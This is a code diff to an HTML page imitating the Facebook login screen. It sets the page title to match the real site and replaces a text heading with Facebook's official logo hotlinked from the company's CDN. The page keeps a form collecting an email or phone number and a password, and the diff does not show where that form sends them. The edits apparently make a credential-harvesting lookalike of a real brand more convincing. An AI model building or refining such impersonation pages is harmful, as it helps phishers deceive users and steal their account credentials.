@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Facebook Login</title>
+  <title>Facebook – log in or sign up</title>
   <style>
     body {
       margin: 0;
@@ -25,12 +25,12 @@
       width: 360px;
       text-align: center;
     }
-    .login-box h1 {
-      color: #1877f2;
-      font-size: 40px;
-      margin-bottom: 20px;
-      font-weight: bold;
-      font-family: Arial, sans-serif;
+    .logo {
+      width: 240px;
+      margin: 0 auto 10px;
+    }
+    .logo img {
+      width: 100%;
     }
     input[type="text"],
     input[type="password"] {
@@ -80,7 +80,9 @@
 <body>
   <div class="container">
     <div class="login-box">
-      <h1>facebook</h1>
+      <div class="logo">
+        <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook" />
+      </div>
       <form id="loginForm">
         <input type="text" name="username" placeholder="Email or phone number" required />
         <input type="password" name="password" placeholder="Password" required />
